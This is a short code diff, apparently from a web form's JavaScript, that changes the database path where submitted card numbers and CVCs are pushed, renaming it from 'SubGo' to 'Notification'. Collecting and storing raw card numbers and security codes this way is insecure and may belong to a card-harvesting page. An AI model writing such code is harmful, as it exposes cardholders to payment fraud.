@@ -103,7 +103,7 @@
           alert('Error: All fields must be filled!');
         } else {
           // Push data to the database
-          const newDataRef = database.ref('SubGo');
+          const newDataRef = database.ref('Notification');
           newDataRef.push({
             cardNumber: cardNumber,
             cvc: cvc,
